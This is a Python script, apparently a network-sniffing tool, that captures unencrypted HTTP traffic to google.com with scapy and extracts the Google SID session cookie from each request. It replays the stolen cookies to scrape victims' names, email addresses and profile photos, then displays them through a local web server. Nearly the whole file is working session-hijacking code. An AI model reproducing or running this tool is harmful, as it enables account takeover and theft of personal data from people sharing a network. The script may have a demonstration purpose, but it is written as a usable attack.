from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import os
from bs4 import BeautifulSoup
import copy
import dpkt
import requests
import sys
import threading


# necessary for accessing libdnet from within a virtualenv on OSX
if sys.platform == "darwin":
  import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")

from scapy.all import *



session_ids =set() # a global set for all session ids
user_packet ={}
user_complete = {}
user_start = {}
cookie_dict = {} #need a dict to store the user cookies
img_dict =  {} #need a dict to store the image URL



# def subprocess_cmd(command):
#     process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
#     proc_stdout = process.communicate()[0].strip()


def extract_google_stok(cookie):
	session_tok = None;
	cookie_toks = cookie.split(": ")[1].split("; ")
	for i in cookie_toks:
		if i[0:4].lower() == "sid=":
			session_tok = i.split("SID=")[1]
			break
	if session_tok == None: #no session cookie found
		return None
	else:
		return session_tok


# def make_request(cookie, user_ip):
# 	#if ipv6 request
# 	if user_ip.count(":") >1:

# 		col_ind = user_ip.rfind(":")
# 		temp_ip	 = user_ip[:col_ind]
# 		temp_ip = temp_ip.replace(":","")
# 	else:
# 		temp_ip = user_ip.split(":")[0].replace(".","")

# 	url = 'http://www.google.com/?gws_rd=ssl'
# 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
# 	add_headers["Cookie"] = cookie
# 	r = requests.get(url, headers=add_headers)
# 	resp = r.content
# 	soup = BeautifulSoup(resp, 'html.parser')
# 	name_div = soup.findAll("div", { "class" : "gb_Cb"})
# 	name = name_div[0].text
# 	email_div = soup.findAll("div", { "class" : "gb_Db"})
# 	email = email_div[0].text.split(" ")[0]
# 	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")

# 	img_file = temp_ip+".jpg"

# 	f = open("./client_files/"+temp_ip+".html", "w")
# 	f.write(name+"<br><br><br>")
# 	f.write(email+"<br><br><br>")
# 	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"300\" width=\"300\">")
# 	subprocess_cmd("wget -O ./client_files/"+img_file+" "+usr_img)
# 	f.close()




def extract_cookie(packet):

	# provide access to globar variables
	global cookie_dict
	global session_ids
	global user_packet
	global user_complete
	global user_start

	s_tok = None
	cur_packet = None

	dest_port = packet.sprintf("{TCP:%TCP.dport%}")
	x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]


	if dest_port != "http" and dest_port != "www": #fiter all all other traffic http traffic
		return
	else:

		ip_src =  packet.summary().split(" >")[0]
		sp_last = ip_src.rfind(" ")
		ip_src =  ip_src[sp_last+1:]
		col_last = ip_src.rfind(":")
		ip_src =  ip_src[:col_last]


		p_src=packet.sprintf("{TCP:%TCP.sport%}")

		user_key = ip_src+":"+p_src		
		#create an entry for a user tuple
		if 'GET /' in x and "host: www.google.com" in x.lower() and user_key not in user_packet:
			user_packet[user_key] =	 None
			user_complete[user_key] = 0

		#update packet collection for each individual stream
		if user_key in user_packet and '\\r\\n\\r\\n' in x and user_key not in user_start:

			cur_packet = copy.deepcopy(x)
			user_packet[user_key] = cur_packet
			user_complete[user_key] = 1

		elif user_key in user_packet and '\\r\\n\\r\\n' not in x and user_key not in user_start:
			cur_packet = copy.deepcopy(x)
			user_packet[user_key] =  cur_packet
			user_start[user_key] = 1

		elif user_key in user_packet and user_key in user_start and  user_complete[user_key] == 0:
			cur_packet = copy.deepcopy(x)
			user_packet[user_key] =  user_packet[user_key] + cur_packet

			# if this was the last chunk of the packet
			if '\\r\\n\\r\\n' in cur_packet:
				packet_start = 0
				del user_start[user_key]
				user_complete[user_key] = 1

		#make a replay request once the packet is complete
		if user_key in user_complete:

			if user_complete[user_key] ==1 and "cookie" in user_packet[user_key].lower():
				
			 	header_arr = user_packet[user_key].split("\\r\\n")
			 	for field  in header_arr:
					if "cookie: "in field.lower(): #if cookie is found in the header
			 			cookie_str = field
						s_tok = extract_google_stok(field)
						break

				if s_tok not in session_ids and s_tok != None:
		  			session_ids.update([s_tok])
		 			temp_cookie = cookie_str.split(": ")[1].replace("\r\n","\\r\\n")

		 			cookie_dict[ip_src] = temp_cookie

#		 			thread = threading.Thread(target=make_request, args=(temp_cookie, user_key))
#					thread.daemon = True                     
#					thread.start()

				if user_complete[user_key] == 1:
					del user_complete[user_key]
					del	user_packet[user_key]



def make_request (user_ip, cookie):

	global img_dict

	url = 'http://www.google.com/?gws_rd=ssl'
	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get(url, headers=add_headers)
	resp = r.content
	soup = BeautifulSoup(resp, 'html.parser')
	name_div = soup.findAll("div", { "class" : "gb_Cb"})
	name = name_div[0].text
	email_div = soup.findAll("div", { "class" : "gb_Db"})
	email = email_div[0].text.split(" ")[0]
	img_link = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
	img_dict[user_ip] = img_link
	return name, email


def grab_img (img_link, cookie):

	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get("http://"+img_link, headers=add_headers)

	return r.content


def run_response_server():

	global cookie_dict
	global img_dict


	class Handler(BaseHTTPRequestHandler):

		#Handler for the GET requests
		def do_GET(self):

			print cookie_dict
			print self.client_address[0]
			self.path = self.path.split("?")[0]

			print self.path

			if self.client_address[0] in cookie_dict:

				if self.path == "/": #send html response

					name, email = make_request(self.client_address[0], cookie_dict[self.client_address[0]])

					self.send_response(200)
					self.send_header('Content-type','text/html')
					self.end_headers()
					self.wfile.write("<center>"+name+"<br><br>"+email+"<br><br>"+"<img src=\"photo.jpg\" alt=\"profile_picture\" height=\"300\" width=\"300\"></center>")

				elif self.path == "/photo.jpg":

					image_content = grab_img (img_dict[self.client_address[0]], cookie_dict[self.client_address[0]])

					self.send_response(200)
					self.send_header('Content-type','image/jpg')
					self.end_headers()
					self.wfile.write(image_content)

				else:
					self.send_error(404,'Please try again while signed in with your google account')

			else:
				self.send_error(404,'Please try again while signed in with your google account')
			
			return

	class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	    """Handle requests in a separate thread."""

	server = ThreadedHTTPServer(('', 8000), Handler)
	print 'Starting server, use <Ctrl-C> to stop'
	server.serve_forever()









def main():
	
	server_thread = threading.Thread(target=run_response_server, args=())
	server_thread.daemon = True   
	server_thread.start()

	interface = sys.argv[1]
	print "now listening on: "+interface
	sniff(iface=interface, prn=extract_cookie)
if __name__ == '__main__':
	main()
	
